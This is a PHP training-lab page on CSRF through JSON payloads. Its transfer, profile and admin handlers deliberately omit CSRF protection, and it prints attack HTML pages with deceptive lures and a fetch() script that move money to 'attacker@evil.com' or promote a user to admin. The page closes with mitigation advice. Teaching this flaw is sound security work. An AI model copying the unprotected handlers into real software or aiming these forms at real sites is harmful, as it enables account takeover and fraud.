<?php
// Lab 4: CSRF with JSON Payloads
// Vulnerability: CSRF attacks using JSON payloads

session_start();

$message = '';
$user_profile = [];
$api_data = [];

// Initialize user profile if not exists
if (!isset($_SESSION['user_profile'])) {
    $_SESSION['user_profile'] = [
        'username' => 'victim_user',
        'email' => 'victim@example.com',
        'role' => 'user',
        'balance' => 1000.00,
        'phone' => '+1-555-0123',
        'address' => '123 Main St, City, State'
    ];
}

$user_profile = $_SESSION['user_profile'];

// Initialize API data if not exists
if (!isset($_SESSION['api_data'])) {
    $_SESSION['api_data'] = [];
}

$api_data = $_SESSION['api_data'];

// Handle JSON API request (vulnerable to CSRF)
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['json_api'])) {
    $json_data = $_POST['json_data'] ?? '';
    
    if ($json_data) {
        $decoded_data = json_decode($json_data, true);
        
        if ($decoded_data) {
            $api_data[] = [
                'data' => $decoded_data,
                'timestamp' => date('Y-m-d H:i:s'),
                'ip' => $_SERVER['REMOTE_ADDR'] ?? 'unknown'
            ];
            
            $_SESSION['api_data'] = $api_data;
            $message = '<div class="alert alert-success">JSON API request processed successfully!</div>';
        } else {
            $message = '<div class="alert alert-danger">Invalid JSON data!</div>';
        }
    }
}

// Handle profile update via JSON (vulnerable to CSRF)
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['json_profile_update'])) {
    $json_profile = $_POST['json_profile'] ?? '';
    
    if ($json_profile) {
        $decoded_profile = json_decode($json_profile, true);
        
        if ($decoded_profile) {
            $_SESSION['user_profile'] = array_merge($user_profile, $decoded_profile);
            $user_profile = $_SESSION['user_profile'];
            $message = '<div class="alert alert-success">Profile updated via JSON!</div>';
        } else {
            $message = '<div class="alert alert-danger">Invalid JSON profile data!</div>';
        }
    }
}

// Handle money transfer via JSON (vulnerable to CSRF)
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['json_transfer'])) {
    $json_transfer = $_POST['json_transfer'] ?? '';
    
    if ($json_transfer) {
        $decoded_transfer = json_decode($json_transfer, true);
        
        if ($decoded_transfer && isset($decoded_transfer['amount']) && isset($decoded_transfer['recipient'])) {
            $amount = (float)$decoded_transfer['amount'];
            $recipient = $decoded_transfer['recipient'];
            
            if ($amount > 0 && $amount <= $user_profile['balance']) {
                $_SESSION['user_profile']['balance'] -= $amount;
                $user_profile = $_SESSION['user_profile'];
                $message = '<div class="alert alert-success">Transfer successful! Sent $' . number_format($amount, 2) . ' to ' . htmlspecialchars($recipient) . '</div>';
            } else {
                $message = '<div class="alert alert-danger">Invalid transfer amount or insufficient funds!</div>';
            }
        } else {
            $message = '<div class="alert alert-danger">Invalid JSON transfer data!</div>';
        }
    }
}

// Handle admin action via JSON (vulnerable to CSRF)
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['json_admin'])) {
    $json_admin = $_POST['json_admin'] ?? '';
    
    if ($json_admin) {
        $decoded_admin = json_decode($json_admin, true);
        
        if ($decoded_admin && isset($decoded_admin['action'])) {
            $action = $decoded_admin['action'];
            
            if ($action === 'promote_user') {
                $_SESSION['user_profile']['role'] = 'admin';
                $user_profile = $_SESSION['user_profile'];
                $message = '<div class="alert alert-success">User promoted to admin via JSON!</div>';
            } elseif ($action === 'add_balance') {
                $amount = (float)($decoded_admin['amount'] ?? 1000);
                $_SESSION['user_profile']['balance'] += $amount;
                $user_profile = $_SESSION['user_profile'];
                $message = '<div class="alert alert-success">Balance increased by $' . number_format($amount, 2) . ' via JSON!</div>';
            }
        } else {
            $message = '<div class="alert alert-danger">Invalid JSON admin data!</div>';
        }
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lab 4: CSRF with JSON Payloads - CSRF Labs</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.9.1/font/bootstrap-icons.css">
    
    <style>
        :root {
            --primary-dark: #1a1f36;
            --accent-green: #48bb78;
            --accent-blue: #4299e1;
            --accent-orange: #ed8936;
            --accent-red: #f56565;
        }
        
        body {
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
            color: #e2e8f0;
            min-height: 100vh;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        .navbar-brand {
            font-weight: 700;
            font-size: 1.5rem;
            color: var(--accent-green) !important;
        }

        .nav-link {
            font-weight: 500;
            transition: color 0.3s;
        }

        .nav-link:hover {
            color: var(--accent-green) !important;
        }

        .hero-section {
            background: linear-gradient(rgba(15, 23, 42, 0.9), rgba(15, 23, 42, 0.9)), 
                        url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="%231e293b"/><path d="M0 0L100 100M100 0L0 100" stroke="%23374151" stroke-width="1"/></svg>');
            padding: 2rem 0;
            border-bottom: 1px solid #2d3748;
            margin-bottom: 2rem;
        }

        .hero-title {
            font-size: 2rem;
            font-weight: 700;
            background: linear-gradient(90deg, #48bb78, #4299e1);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 0.5rem;
        }

        .hero-subtitle {
            font-size: 1rem;
            color: #cbd5e0;
        }

        .section-title {
            margin-top: 30px;
            margin-bottom: 20px;
            font-weight: 700;
            font-size: 1.5rem;
            position: relative;
            padding-bottom: 10px;
        }

        .section-title::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            width: 60px;
            height: 4px;
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border-radius: 2px;
        }

        .card {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            color: #e2e8f0;
        }

        .card-header {
            background: rgba(15, 23, 42, 0.5);
            border-bottom: 1px solid #334155;
            font-weight: 600;
            padding: 1rem 1.5rem;
        }

        .form-control, .form-select {
            background: rgba(30, 41, 59, 0.7);
            border: 1px solid #334155;
            color: #e2e8f0;
            padding: 0.75rem 1rem;
        }

        .form-control:focus, .form-select:focus {
            background: rgba(30, 41, 59, 0.9);
            border-color: var(--accent-green);
            box-shadow: 0 0 0 0.2rem rgba(72, 187, 120, 0.25);
            color: #e2e8f0;
        }

        .form-label {
            font-weight: 500;
            color: #cbd5e0;
        }

        .btn-primary {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border: none;
            padding: 0.75rem 1.5rem;
            font-weight: 600;
            transition: all 0.3s;
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(72, 187, 120, 0.3);
        }

        .vulnerability-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-orange);
        }

        .payload-examples {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-blue);
        }

        .danger-zone {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-red);
        }

        pre {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            color: #e2e8f0;
            border: 1px solid #334155;
            overflow-x: auto;
        }

        .lab-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
        }

        .lab-badge {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            color: #1a202c;
            font-weight: 600;
            padding: 0.5rem 1rem;
            border-radius: 6px;
            display: inline-block;
            margin-bottom: 1rem;
        }

        .json-display {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            margin: 1rem 0;
            border-left: 4px solid var(--accent-green);
        }

        .test-urls {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin-bottom: 1rem;
            border-left: 4px solid var(--accent-blue);
        }

        .json-info {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
        }

        .sensitive-data {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-red);
        }

        .code-block {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-blue);
            font-family: 'Courier New', monospace;
            white-space: pre-wrap;
        }
    </style>
</head>
<body>
    <nav class="navbar navbar-expand-md navbar-dark sticky-top" style="background-color: var(--primary-dark);">
        <div class="container-fluid">
            <a class="navbar-brand" href="index.php">
                <i class="bi bi-arrow-left me-2"></i>Back to CSRF Labs
            </a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse"
                data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false"
                aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>

            <div class="collapse navbar-collapse" id="navbarSupportedContent">
                <ul class="navbar-nav me-auto mb-2 mb-lg-0">
                    <li class="nav-item">
                        <a class="nav-link active" href="../about">About</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link active" href="../contact">Contact Us</a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>

    <div class="hero-section">
        <div class="container">
            <h1 class="hero-title">Lab 4: CSRF with JSON Payloads</h1>
            <p class="hero-subtitle">CSRF attacks using JSON payloads</p>
        </div>
    </div>

    <div class="container mb-5">
        <div class="lab-info">
            <span class="lab-badge">Difficulty: High</span>
            <h3 class="section-title">Lab Overview</h3>
            <p>This lab demonstrates CSRF vulnerabilities that can be exploited using JSON payloads. Many modern web applications accept JSON data, and attackers can craft malicious JSON payloads to perform unauthorized actions.</p>
            <p><strong>Objective:</strong> Use JSON payloads to perform CSRF attacks and bypass traditional form-based protections.</p>
        </div>

        <div class="row">
            <div class="col-lg-6">
                <div class="card mb-4">
                    <div class="card-header text-center">
                        <i class="bi bi-code-slash me-2"></i>Vulnerable Code
                    </div>
                    <div class="card-body">
                        <pre>
// Vulnerable: No CSRF protection on JSON API
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['json_api'])) {
    $json_data = $_POST['json_data'] ?? '';
    $decoded_data = json_decode($json_data, true);
    
    // Process JSON data without CSRF validation
    $_SESSION['api_data'][] = [
        'data' => $decoded_data,
        'timestamp' => date('Y-m-d H:i:s')
    ];
}

// Vulnerable: Profile update via JSON
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['json_profile_update'])) {
    $json_profile = $_POST['json_profile'] ?? '';
    $decoded_profile = json_decode($json_profile, true);
    
    // Update profile without CSRF validation
    $_SESSION['user_profile'] = array_merge($user_profile, $decoded_profile);
}</pre>
                    </div>
                </div>
            </div>
            
            <div class="col-lg-6">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-code-slash me-2"></i>JSON API Status
                    </div>
                    <div class="card-body">
                        <?php echo $message; ?>
                        
                        <div class="json-info">
                            <h5>Current Profile</h5>
                            <p><strong>Username:</strong> <?php echo htmlspecialchars($user_profile['username']); ?></p>
                            <p><strong>Email:</strong> <?php echo htmlspecialchars($user_profile['email']); ?></p>
                            <p><strong>Role:</strong> <?php echo htmlspecialchars($user_profile['role']); ?></p>
                            <p><strong>Balance:</strong> $<?php echo number_format($user_profile['balance'], 2); ?></p>
                        </div>
                        
                        <div class="json-info">
                            <h5>API Requests (<?php echo count($api_data); ?>)</h5>
                            <?php if (empty($api_data)): ?>
                                <p class="text-muted">No API requests yet.</p>
                            <?php else: ?>
                                <?php foreach (array_slice($api_data, -3) as $index => $request): ?>
                                    <div class="json-info">
                                        <p><strong>Request <?php echo $index + 1; ?>:</strong> <?php echo htmlspecialchars($request['timestamp']); ?></p>
                                        <p><strong>Data:</strong> <?php echo htmlspecialchars(json_encode($request['data'])); ?></p>
                                    </div>
                                <?php endforeach; ?>
                            <?php endif; ?>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="row mt-4">
            <div class="col-md-6">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-code-slash me-2"></i>JSON API Request
                    </div>
                    <div class="card-body">
                        <form method="POST">
                            <input type="hidden" name="json_api" value="1">
                            <div class="mb-3">
                                <label for="json_data" class="form-label">JSON Data</label>
                                <textarea class="form-control" id="json_data" name="json_data" 
                                          rows="4" placeholder="Enter JSON data...">{"action": "test", "data": "sample"}</textarea>
                            </div>
                            <button type="submit" class="btn btn-primary">Send JSON API Request</button>
                        </form>
                    </div>
                </div>
            </div>
            
            <div class="col-md-6">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-person-gear me-2"></i>Profile Update via JSON
                    </div>
                    <div class="card-body">
                        <form method="POST">
                            <input type="hidden" name="json_profile_update" value="1">
                            <div class="mb-3">
                                <label for="json_profile" class="form-label">JSON Profile Data</label>
                                <textarea class="form-control" id="json_profile" name="json_profile" 
                                          rows="4" placeholder="Enter JSON profile data...">{"username": "updated_user", "email": "updated@example.com"}</textarea>
                            </div>
                            <button type="submit" class="btn btn-primary">Update Profile via JSON</button>
                        </form>
                    </div>
                </div>
            </div>
        </div>

        <div class="row mt-4">
            <div class="col-md-6">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-arrow-left-right me-2"></i>Money Transfer via JSON
                    </div>
                    <div class="card-body">
                        <form method="POST">
                            <input type="hidden" name="json_transfer" value="1">
                            <div class="mb-3">
                                <label for="json_transfer" class="form-label">JSON Transfer Data</label>
                                <textarea class="form-control" id="json_transfer" name="json_transfer" 
                                          rows="4" placeholder="Enter JSON transfer data...">{"amount": 100, "recipient": "attacker@evil.com"}</textarea>
                            </div>
                            <button type="submit" class="btn btn-primary">Transfer via JSON</button>
                        </form>
                    </div>
                </div>
            </div>
            
            <div class="col-md-6">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-shield-lock me-2"></i>Admin Action via JSON
                    </div>
                    <div class="card-body">
                        <form method="POST">
                            <input type="hidden" name="json_admin" value="1">
                            <div class="mb-3">
                                <label for="json_admin" class="form-label">JSON Admin Data</label>
                                <textarea class="form-control" id="json_admin" name="json_admin" 
                                          rows="4" placeholder="Enter JSON admin data...">{"action": "promote_user"}</textarea>
                            </div>
                            <button type="submit" class="btn btn-primary">Execute Admin Action</button>
                        </form>
                    </div>
                </div>
            </div>
        </div>

        <div class="row mt-4">
            <div class="col-md-6">
                <div class="vulnerability-info">
                    <h5><i class="bi bi-bug me-2"></i>Vulnerability Details</h5>
                    <ul>
                        <li><strong>Type:</strong> CSRF with JSON Payloads</li>
                        <li><strong>Severity:</strong> High</li>
                        <li><strong>Method:</strong> POST</li>
                        <li><strong>Issue:</strong> No CSRF protection on JSON API endpoints</li>
                    </ul>
                </div>
            </div>
            
            <div class="col-md-6">
                <div class="payload-examples">
                    <h5><i class="bi bi-target me-2"></i>JSON CSRF Attack Examples</h5>
                    <ul>
                        <li><code>json_csrf.html</code> - Basic JSON CSRF attack</li>
                        <li><code>json_profile_csrf.html</code> - Profile update via JSON</li>
                        <li><code>json_transfer_csrf.html</code> - Money transfer via JSON</li>
                    </ul>
                </div>
            </div>
        </div>

        <div class="test-urls">
            <h5><i class="bi bi-link me-2"></i>JSON CSRF Attack Payloads</h5>
            <p>Create these malicious HTML files to test JSON CSRF attacks:</p>
            
            <h6>1. Basic JSON CSRF (json_csrf.html):</h6>
            <div class="code-block">&lt;html&gt;
&lt;body&gt;
    &lt;h1&gt;API Integration Test&lt;/h1&gt;
    &lt;form action="http://localhost/test/csrf/4.php" method="POST"&gt;
        &lt;input type="hidden" name="json_api" value="1"&gt;
        &lt;input type="hidden" name="json_data" value='{"action": "hack", "data": "malicious"}'&gt;
        &lt;input type="submit" value="Test API"&gt;
    &lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;</div>

            <h6>2. Profile Update JSON CSRF (json_profile_csrf.html):</h6>
            <div class="code-block">&lt;html&gt;
&lt;body&gt;
    &lt;h1&gt;Profile sync required!&lt;/h1&gt;
    &lt;form action="http://localhost/test/csrf/4.php" method="POST"&gt;
        &lt;input type="hidden" name="json_profile_update" value="1"&gt;
        &lt;input type="hidden" name="json_profile" value='{"username": "hacked_user", "email": "hacker@evil.com", "role": "admin"}'&gt;
        &lt;input type="submit" value="Sync Profile"&gt;
    &lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;</div>

            <h6>3. Money Transfer JSON CSRF (json_transfer_csrf.html):</h6>
            <div class="code-block">&lt;html&gt;
&lt;body&gt;
    &lt;h1&gt;Payment processing update!&lt;/h1&gt;
    &lt;form action="http://localhost/test/csrf/4.php" method="POST"&gt;
        &lt;input type="hidden" name="json_transfer" value="1"&gt;
        &lt;input type="hidden" name="json_transfer" value='{"amount": 500, "recipient": "attacker@evil.com"}'&gt;
        &lt;input type="submit" value="Process Payment"&gt;
    &lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;</div>

            <h6>4. Advanced JSON CSRF with JavaScript:</h6>
            <div class="code-block">&lt;html&gt;
&lt;body&gt;
    &lt;h1&gt;Advanced JSON CSRF Attack&lt;/h1&gt;
    &lt;script&gt;
        // Create JSON payload
        var jsonPayload = {
            "action": "admin_action",
            "data": {
                "command": "promote_user",
                "target": "attacker"
            }
        };
        
        // Send JSON request
        fetch('http://localhost/test/csrf/4.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: 'json_admin=1&json_admin=' + encodeURIComponent(JSON.stringify(jsonPayload))
        });
    &lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;</div>
        </div>

        <div class="danger-zone">
            <h5><i class="bi bi-exclamation-triangle me-2"></i>Real-World Attack Scenarios</h5>
            <ul>
                <li>Bypass traditional form-based CSRF protections</li>
                <li>Exploit modern web applications that accept JSON</li>
                <li>Perform unauthorized API calls and data modifications</li>
                <li>Execute administrative actions and privilege escalation</li>
                <li>Bypass client-side validation and security controls</li>
                <li>Compliance violations and security breaches</li>
            </ul>
        </div>

        <div class="card mt-4">
            <div class="card-header">
                <i class="bi bi-lightbulb me-2"></i>Mitigation Strategies
            </div>
            <div class="card-body">
                <ul>
                    <li>Implement CSRF tokens for all JSON API endpoints</li>
                    <li>Use proper Content-Type validation for JSON requests</li>
                    <li>Implement request origin validation and CORS policies</li>
                    <li>Use SameSite cookie attributes</li>
                    <li>Implement proper API authentication and authorization</li>
                    <li>Regular security testing and vulnerability assessments</li>
                    <li>Monitor for unusual JSON request patterns and anomalies</li>
                </ul>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
